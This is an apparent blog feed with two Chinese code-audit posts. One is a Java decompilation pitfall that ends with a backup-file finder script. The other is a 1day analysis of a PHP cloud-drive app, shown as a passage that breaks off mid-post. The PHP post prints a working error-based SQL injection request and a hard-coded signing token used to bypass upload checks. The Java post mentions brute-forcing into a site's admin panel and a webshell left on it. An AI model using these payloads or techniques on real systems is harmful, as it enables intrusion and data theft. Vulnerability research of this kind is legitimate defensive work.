    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为‍<a href="https://xz.aliyun.com/t/13859">https://xz.aliyun.com/t/13859</a></p><p>好心酸写这篇文章的时候，因为已经是下午四点整了，从早上的10点开始审这个代码，到现在只解决了一个问题，想SI的心都有了，还是含泪记录下本次<code>Java</code>​的踩坑记录吧，可能有师傅遇到过可能也觉得我很逗比，但还是发出来减少大家遇到这种问题的情况吧</p><p>‍</p><p>‍</p><h1 id="踩坑日记"><a href="#踩坑日记" class="headerlink" title="踩坑日记"></a>踩坑日记</h1><p>起因是因为有套Java被催着审，于是买了杯维他命水就开始看了，常规简单的操作就不说了什么上依赖反编译啥的，因为这些老生常谈而且作为审计Java的师傅来说真的就是家常便饭，所以我反编译啥的只是时间问题，于是就快速一顿操作进行基础环境的搭建就开始审计了</p><p>‍</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>搜索<code>upload</code>​一个一个找 发现了在这里</p><p><code>@RequestMapping(&#123;&quot;/attachment/*&quot;&#125;)</code>​</p><p>有个<code>fileUpload.action</code>​映射</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645410.png" alt="image">​​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645889.png" alt="image">​</p><p>跟进<code>saveFile</code>​方法 发现是接口的方法，寻找实现接口的类重写的<code>saveFile</code>​方法</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645086.png" alt="image">​</p><p>‍</p><p>跟到<code>\service\impl\AttachmentServiceImpl.java</code>​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645229.png" alt="image">​​</p><p>关键代码就是</p><p>‍</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">String</span> <span class="hljs-variable">fileSuffix</span> <span class="hljs-operator">=</span> FileUtil.getFileSuffix(uFile.getOriginalFilename()); <span class="hljs-comment">// 直接获取用户上传的文件名后缀</span><br><span class="hljs-type">String</span> <span class="hljs-variable">fileName</span> <span class="hljs-operator">=</span> String.valueOf(DateUtils.formatNow(<span class="hljs-string">&quot;yyyyMMddHHmmssSSS&quot;</span>)) + fileSuffix; <span class="hljs-comment">// 并且与时间进行拼接</span><br> <span class="hljs-type">String</span> <span class="hljs-variable">url</span> <span class="hljs-operator">=</span> String.valueOf(basePath) + <span class="hljs-string">&quot;uploadFile/&quot;</span> + attachment.getMark() + <span class="hljs-string">&quot;/&quot;</span> + attachment.getUsername() + <span class="hljs-string">&quot;/&quot;</span> + fileName; <span class="hljs-comment">// 生成文件的路径</span><br><br><span class="hljs-comment">//接着就是真正的将上传的文件写入到一个File对象当中存储</span><br>byte0 = uFile.getBytes();<br><span class="hljs-type">File</span> <span class="hljs-variable">targetFile</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(pathUrl, fileName);<br>uFile.transferTo(targetFile);<br>targetFile.setReadOnly();<br></code></pre></td></tr></table></figure><p>‍</p><p>所以代码逻辑就清楚了，后续的关于<code>Attachment</code>​其实就是存储文件信息而已，实际已经上传成功了，但是其实这个上传是后台的上传</p><p>‍</p><p>因为在<code>web.xml</code>​中发现过滤器是需要鉴权的</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml">    <span class="hljs-tag">&lt;<span class="hljs-name">filter</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>sessionFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-class</span>&gt;</span>com.xxx.xxx.filter.SessionFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-class</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">filter-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">filter-name</span>&gt;</span>sessionFilter<span class="hljs-tag">&lt;/<span class="hljs-name">filter-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>*.action<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">filter-mapping</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645514.png" alt="image">​</p><p>就是个判断登录的逻辑，所以只能是后台了，由于是很早很早之前的就拿到的源码，当时是找到了账号的初始密码，所以通过默认密码+账号爆破再一次进入到该站的后台当中</p><p>‍</p><p>上传附件抓到报文</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091655454.png"></p><p>可以发现他的接口如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">/xxxx/xxxxx/fileUpload.action;jsessionid=xxxxxx?mark=xxxxx&amp;fileUUID=xxxxx<br></code></pre></td></tr></table></figure><p>说明<code>fileUUID</code>​  跟 <code>mark</code>​ 都为可控点并且是某个处理逻辑进行处理的，比较轻松的就是他返回了上传地址</p><p>‍</p><p>但是上传jsp的时候就返回了</p><p><code>上传材料格式不正确</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645124.png" alt="image">​​​</p><p>‍</p><p>虽然源码比较久远，但是马子还在，于是上去再看了下改过的代码下来 发现他有一个很奇葩的写法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645314.png" alt="image">​​</p><p>我一开始以为是黑名单，但是仔细一看，发现是白名单啊！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">   <span class="hljs-keyword">if</span> (!fileSuffix2.endsWith(<span class="hljs-string">&quot;jpg&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;jpeg&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;gif&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;png&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;bmp&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;jsp&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;js&quot;</span>) &amp;&amp; !fileSuffix2.endsWith(<span class="hljs-string">&quot;html&quot;</span>)) &#123;<br>msg = <span class="hljs-string">&quot;上传材料格式不正确&quot;</span>;&#125; <br></code></pre></td></tr></table></figure><p>但是可是事实就是传不上去，难道是有什么限制吗？于是全局搜索了下<code>上传材料格式不正确</code>​ 关键词 ，发现仅仅只有四处存在</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645655.png" alt="image">​​</p><p>然后本地测了一下第一个<code>上传材料格式不正确</code>​ 发现肯定是能走进去的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645890.png" alt="image">​</p><p>第二个<code>上传材料格式不正确</code>​也不可能 因为根本走不到这里，因为只要后缀名为空就会被<code>catch</code>​捕捉到报错而进行报错，并不会因为后缀名为空就进入到这个<code>上传材料格式不正确</code>​中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645138.png" alt="image">​</p><p>那么其他的就是不是这个接口或者没引用到了，那么回顾下，种种的测试都指向了，我的后缀名<code>.jsp</code>​并没有被白名单所匹配到 emmmm。。。存疑？可是我本地没问题啊。。。一样的代码，根本不需要考虑过滤器的原因，如果过滤器这地方拦了就不会显示<code>上传材料格式不正确</code>​了，好奇怪 </p><p>‍</p><p>然后经过了两三四五个小时，最终经过了几个小伙伴的帮忙，终于找到了问题！真的x了，找到问题的前一个小时里头，我还写了以下笔记</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645417.png" alt="image"></p><p>‍</p><h2 id="小丑想法"><a href="#小丑想法" class="headerlink" title="小丑想法"></a>小丑想法</h2><p>‍</p><p>最终发现TMD是<code>Jadx</code>​的问题，我发现他针对单文件的反编译是很正常的，但是只要是一个目录下，他就发生了一些错乱，比如 增加莫名其妙的代码或者是反编译错误把别的地方的代码混杂在一起，以下是踩坑记录</p><p>‍</p><p>首先目录结构如下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645543.png" alt="image"></p><p>‍</p><p>(<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091652749.png">)</p><p>‍</p><p>‍</p><p>此时以<code>IDEA的反编译</code>​ + <code>jd-gui.exe</code>​ + <code>jadx</code>​ 三个反编译工具进行演示</p><p>‍</p><p>以下都关注方法<code>fileUpload</code>​内容</p><p>IDEA直接打开<code>AttachmentController.class</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645808.png" alt="image">​​</p><p><code>jd-gui.exe</code>​ 直接打开<code>AttachmentController.class</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645058.png" alt="image">​</p><p>此时使用<code>Jadx</code>​打开单文件</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645277.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645402.png" alt="image">​</p><p>接下来就是坑点了，使用<code>Jadx</code>​打开当前的目录</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645902.png" alt="image">​</p><p>‍</p><p>正当我准备搞清楚问题之后，我满脑子已经想好了如何给<code>Jadx</code>​进行提交<code>Issues</code>​认为百分百是<code>Jadx</code>​的多文件目录反编译问题 然后得到@<a href="https://github.com/skylot">skylot</a> 那牛子的感谢然后觉得今天一天的踩坑非常的值得，可惜做梦是美好的 然而，当我一打开整个目录发现一样可以正常反编译一点毛病都没我当场已经裂开了，真的不知道用什么心情可以形容当时的我</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091659503.png"></p><p>然后我去洗了把脸重新去看我反编译的目录的时候，我发现了一个东西—-&gt;缓存&#x2F;备份</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645274.png" alt="image">​</p><p>我的妈耶，220627 220926 的<code>classbak</code>​ 我没仔细看直接就反编译了，我一口老血吐出来，然后带着这些文件我再次打开这个目录</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645398.png" alt="image">​</p><p>果然万恶之源就是这个备份！！</p><p>最终问题解决，一天时间又这样子没了，害，这就是<code>Java</code>​吧</p><p>‍</p><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>果然<code>Java</code>​真是个神奇的东西，稍微不细心一天就没了，原来时间就这么流逝的，好开心，因为<code>Java</code>​又活了一天啦，谢谢你<code>Java</code>​</p><p>回归正题，以后反编译还是要先留个心眼吧，以后TMD先看看有无缓存 别上来就直接反编译了，害 裂开，为了避免自己二次踩坑，也是写了个非常简单的脚本，源码第一步！先扫扫看看有无可以的文件后缀吧呜呜呜</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Author: Zjacky</span><br><span class="hljs-string">Date: 2024/1/9</span><br><span class="hljs-string">Name: bak_finder.py</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># rest of the code goes here</span><br> <br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> argparse<br><br>parser = argparse.ArgumentParser(description=<span class="hljs-string">&#x27;Scan files for keywords.&#x27;</span>)<br>parser.add_argument(<span class="hljs-string">&#x27;-r&#x27;</span>, <span class="hljs-string">&#x27;--root&#x27;</span>, <span class="hljs-built_in">help</span>=<span class="hljs-string">&#x27;the root directory to scan&#x27;</span>)<br>args = parser.parse_args()<br><br><span class="hljs-comment"># 定义你想要匹配的关键字列表</span><br>keywords = [<span class="hljs-string">&#x27;bak&#x27;</span>, <span class="hljs-string">&#x27;beifen&#x27;</span>]<br><br><br><span class="hljs-keyword">for</span> dirpath, dirnames, filenames <span class="hljs-keyword">in</span> os.walk(args.root):<br>    <span class="hljs-keyword">for</span> filename <span class="hljs-keyword">in</span> filenames:<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">any</span>(keyword <span class="hljs-keyword">in</span> filename <span class="hljs-keyword">for</span> keyword <span class="hljs-keyword">in</span> keywords):<br>            <span class="hljs-built_in">print</span>(os.path.join(dirpath, filename))<br><br><span class="hljs-comment"># python3 back.py -r 目录</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401091645569.png" alt="image">​</p><p>‍</p><p>‍</p><p>所以最后回看代码，发现是进行了白名单的限制的 所以上传的洞就没了，于是整个流程下来一天又没了。。。。害，又要继续被迫营业了</p><p>‍</p><p>‍</p><p>‍</p>]]></content>
    
    
    <categories>
      
      <category>踩坑</category>
      
    </categories>
    
    
    <tags>
      
      <tag>踩坑</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 - PHP - 某网盘1day分析</title>
    <link href="/post/code-audit-php-network-disk-1day-analysis-duplicated-20240108-19-32-53-1i9ljt.html"/>
    <url>/post/code-audit-php-network-disk-1day-analysis-duplicated-20240108-19-32-53-1i9ljt.html</url>
    
    <content type="html"><![CDATA[<p>‍</p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本篇文章首发在先知社区(为先知打Call) 作者Zjacky(本人) 先知社区名称: <code>Zjacky</code> 原文链接为<a href="https://xz.aliyun.com/t/13868">https://xz.aliyun.com/t/13868</a></p><p>代码审计篇章都是自己跟几个师傅们一起审计的1day或者0day(当然都是小公司较为简单)，禁止未经允许进行转载，发布到博客的用意主要是想跟师傅们能够交流下审计的思路，毕竟审计的思路也是有说法的，或者是相互源码共享也OK，本次审计的目标是某开源网盘的审计，大部分是一些带颜色的网站和奇怪的东东使用，有师傅分析过了但没详细审计思路于是有了这篇博客来交流交流</p><p>‍</p><h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>‍</p><h2 id="路由分析"><a href="#路由分析" class="headerlink" title="路由分析"></a>路由分析</h2><p>‍</p><p>首先这里明眼人一看就知道在<code>application</code>​这个目录下，可以抓登录的接口或者注册的接口或者进去后的接口来判断对应的代码之后登录进去寻找文件</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933760.png" alt="image">​​</p><p>‍</p><p>‍​<img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933197.png" alt="image">​​</p><p>路由很少，所以很明显看出我们登录的<code>/user/login/</code>​对应的是<code>index</code>​目录下的<code>User.php</code>​的<code>login</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933501.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="后台SQL注入"><a href="#后台SQL注入" class="headerlink" title="后台SQL注入"></a>后台SQL注入</h2><p>emm本来想看前台的，但是大部分是存在鉴权代码的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933732.png" alt="image">​</p><p><code>$this-&gt;userInfo[&#39;id&#39;]</code>​</p><p>由于是TP的框架，所以先来回顾下TP的<code>where</code>​语句</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933842.png" alt="7a43a6589314728fd86a0126f8c3288">​</p><p>在TP框架中，大部分的SQL查询都是做了参数绑定的，如下图所示</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933965.png" alt="image">​</p><p>这里的<code>$code</code>​就是做了参数绑定，但是一开始去试着访问的时候发现是 <code>404</code>​ 并且返回非法请求</p><p>然后参考了下这篇文章 发现原来可能存在路由定义的问题</p><p><a href="https://www.kancloud.cn/z8859346/thinkphp/1747811">https://www.kancloud.cn/z8859346/thinkphp/1747811</a></p><p>找到<code>/route/route.php</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933133.png" alt="image">​</p><p>发现对<code>index</code>​这个模块进行了定义，所以要根据他的规则来进行访问，只要访问了<code>/s:code</code>​就会去访问<code>index/share</code>​方法</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png" alt="image">​</p><p>但因为<code>:code</code>​进行了占位符 所以相当于绑定了参数无法进行注入</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933808.png" alt="image">​</p><p>所以这些点都不存在SQL注入</p><p>‍</p><p>‍</p><p>于是转向了后台</p><p>‍</p><p>跟踪到index的file文件，发现了<code>list()</code>​方法这里接受几个可控的 参数<code>foloder.id</code>​、<code>search</code>​，进入到<code>FileManager#listFile()</code>​方法中</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933932.png" alt="image">​</p><p>主要是因为<code>listfile()</code>​这个命名还是很大可能会跟数据库有关联的，所以跟进下</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933059.png" alt="image">​</p><p>这<code>listFile</code>​这个方法里面，他会先执行<code>self</code>​类里面的<code>getfolderPid</code>​这个方法,并且传入<code>$folder_id</code>​</p><p>再次跟进</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933183.png" alt="image">​</p><p>我们传入的内容不为空，所以传了啥返回啥，接下来往下走就是整个SQL的一个坑点了</p><p>‍</p><h3 id="坑点"><a href="#坑点" class="headerlink" title="坑点"></a>坑点</h3><p>‍</p><p>接着就是数组的形式进行赋值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933324.png" alt="image">​</p><p>那么现在问题来了，他是以数组的形式去进行sql查询，那么可能存在sql的点吗？我们来进行mysql的监控</p><p>‍</p><p>代码如下，先是单数组正常使用<code>select</code>​查询</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$ttt</span> = <span class="hljs-title function_ invoke__">db</span>(<span class="hljs-string">&#x27;stores&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">where</span>([<span class="hljs-string">&#x27;parent_folder&#x27;</span>=&gt;<span class="hljs-variable">$folder_id</span>])<br>    -&gt;<span class="hljs-title function_ invoke__">where</span>(<span class="hljs-string">&#x27;origin_name&#x27;</span>,<span class="hljs-string">&#x27;like&#x27;</span>,<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$search</span>.<span class="hljs-string">&#x27;%&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">field</span>(<span class="hljs-string">&#x27;id,uid,shares_id,origin_name as name,ext,size,count_down,count_open,update_time&#x27;</span>)<br>    -&gt;<span class="hljs-title function_ invoke__">select</span>();<br><br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$ttt</span>);<br><span class="hljs-keyword">die</span>();<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933451.png" alt="image">​</p><p>发现正常转义了，那么双数组跟三数组也是一样到效果，那么这里就得到一个结论，并不是因为数组的拼接问题所导致的sql注入，那么细心的话可以发现，我的代码其实跟原始代码是有一定的区别的，就是并没有加入一个关键代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">-&gt;<span class="hljs-title function_ invoke__">fetchSql</span>(<span class="hljs-literal">true</span>)<br></code></pre></td></tr></table></figure><p>这里来解释一下<code>fetchSql</code>​ 方法</p><p>‍</p><blockquote><p><span style="font-weight: bold;" data-type="strong">fetchSql</span> 方法在 ThinkPHP 框架中（以及其他可能支持该功能的框架或数据库操作类）的主要作用是获取即将执行的 SQL 查询语句，而不是真正执行这个查询。当你调用 <span style="font-weight: bold;" data-type="strong">fetchSql(true)</span>  时，框架会生成对应的 SQL 语句并返回，但并不会执行该 SQL</p></blockquote><p>‍</p><p>啥意思呢，来看数据库监控</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933844.png" alt="image">​</p><p>可以发现数据库监控仅仅只是输出了一条 展示字段的SQL语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SHOW</span> COLUMNS <span class="hljs-keyword">FROM</span> `sk_stores`<br></code></pre></td></tr></table></figure><p>那其实就是因为他压根就没有进行查询我们的<code>where</code>​条件 —&gt; 这其实就也印证了我之前一直说 并没有在数据库监控中看到这些查询语句，是因为使用了<code>fetchSql(true)</code>​</p><p>‍</p><p>那么接下来既然是没有进行SQL语句的执行的，那么也就是我们现在的<code>$files_sql</code>​是一条尚未执行的SQL语句，我们来打印一下看看</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">string</span>(<span class="hljs-number">221</span>) <span class="hljs-string">&quot;SELECT `id`,`uid`,`shares_id`,origin_name as name,`ext`,`size`,`count_down`,`count_open`,`update_time` FROM `sk_stores` WHERE  `uid` = 10  AND `parent_folder` = 3&#x27;  AND `delete_time` IS NULL  AND `origin_name` LIKE &#x27;%aa%&#x27;&quot;</span><br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933145.png" alt="image">​</p><p>正是因为没有带入数据库查询，所以里面的特殊符号比如<code>&#39;</code>​就并没有参数绑定或者预编译或者转义，而最终产生SQL注入的万恶之源，正是下方的<code>union</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933288.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933413.png" alt="image">​</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `id`,`uid`,`shares_id`,folder_name <span class="hljs-keyword">as</span> name,`ext`,`size`,`count_down`,`count_open`,`update_time` <span class="hljs-keyword">FROM</span> `sk_folders` <span class="hljs-keyword">WHERE</span>  `uid` <span class="hljs-operator">=</span> <span class="hljs-number">10</span>  <span class="hljs-keyword">AND</span> `parent_folder` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;3&#x27;</span>  <span class="hljs-keyword">AND</span> `delete_time` <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>  <span class="hljs-keyword">AND</span> `folder_name` <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%aa%&#x27;</span> <br><br><span class="hljs-keyword">UNION</span> <span class="hljs-keyword">ALL</span> <br><br>( <span class="hljs-keyword">SELECT</span> `id`,`uid`,`shares_id`,origin_name <span class="hljs-keyword">as</span> name,`ext`,`size`,`count_down`,`count_open`,`update_time` <span class="hljs-keyword">FROM</span> `sk_stores` <span class="hljs-keyword">WHERE</span>  `uid` <span class="hljs-operator">=</span> <span class="hljs-number">10</span>  <span class="hljs-keyword">AND</span> `parent_folder` <span class="hljs-operator">=</span> <span class="hljs-number">3</span>  <span class="hljs-keyword">AND</span> `delete_time` <span class="hljs-keyword">IS</span> <span class="hljs-keyword">NULL</span>  <span class="hljs-keyword">AND</span> `origin_name` <span class="hljs-keyword">LIKE</span> <span class="hljs-string">&#x27;%aa%&#x27;</span> ) LIMIT <span class="hljs-number">0</span>,<span class="hljs-number">20</span><br></code></pre></td></tr></table></figure><p>所以最终的结果就是因为通过了<code>union</code>​去拼接起来了，所以才导致了SQL注入的产生，破案了</p><p>‍</p><p>最终报文如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml">GET /file/list?folder_id=1-updatexml(1,concat(0x7e,database(),0x7e),1)&amp;search=&amp;page=&amp;rows= HTTP/1.1<br>Host: wp.com<br>Accept: application/json, text/javascript, */*; q=0.01<br>X-Requested-With: XMLHttpRequest<br>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.5790.171 Safari/537.36<br>Content-Type: application/json<br>Referer: http://wp.com/user/index<br>Accept-Encoding: gzip, deflate<br>Accept-Language: zh-CN,zh;q=0.9<br>Cookie: PHPSESSID=21cpn2h5jqf7e47k8dtlrhnmk4<br>Connection: close<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933776.png" alt="image">​</p><p>‍</p><p>‍</p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p>‍</p><p>首先全局搜索<code>move_uploaded_file</code>​函数，发现<code>public/server/index.php</code>​文件引用该函数</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933910.png" alt="image">​</p><p>之后便发现这个方法是一个<code>protected</code>​权限来修饰，所以这个方法直接调用不成功</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933062.png" alt="image">​</p><p>之后就要去观看这个文件被谁来调用 发现是<code>\public\server\index.php#start()</code>​调用了，刚好是符合<code>protected</code>​属性的</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933596.png" alt="image">​</p><p>‍</p><p>但是往上看发现存在验签操作</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933720.png" alt="image">​</p><p>‍</p><p>发现是存在两个传参，<code>$command</code>​ <code>$sign</code>​ 并且是需要验签的，那我们跟进<code>sign_verify</code>​看看</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933877.png" alt="image">​</p><p>‍</p><p>继续跟进​<code>sign_params</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933003.png" alt="image">​</p><p>‍</p><p>如果不理解我们可以写个demo本地测试下</p><p>首先流程如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">我们传入的HTTP参数 这个数组的<span class="hljs-built_in">hash</span>  == 我们sign传入的<span class="hljs-built_in">hash</span> <br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933113.png" alt="image">​</p><p>他会把我们传入的<code>$sign</code>​不作为<code>$params</code>​去传参</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933321.png" alt="image">​​</p><p>那么逻辑就清楚了就是我们<code>GET</code>​传参的内容跟我们<code>token</code>​传入的内容进行拼接且MD5的值跟我们<code>$sign</code>​要相同</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933570.png" alt="image">​</p><p>‍</p><p>如果验签成功，就能够进入到<code>upload</code>​的逻辑中</p><p>之后就调用<code>upload_file</code>​这个函数，这个函数我也说了，他是调用<code>move_uplaoded_file</code>​函数进行上传的，他接受一个参数<code>uid</code>​的值</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/blog/202401081933744.png" alt="image">​</p><p>‍</p><p>那么在这里我们就尝试进行复现，当刚打开BP我就发现问题了，emmm在上述的demo中我是写死了拼接的字符串的，但是远程是<code>$this-&gt;config[&#39;token&#39;]</code>​ 拼接这个东西啊，所以跟进一下这个<code>$config</code>​的内容，发现在最下面就定义了token的内容为<code>asdasfasfasfasfasfa</code>​</p><p><img 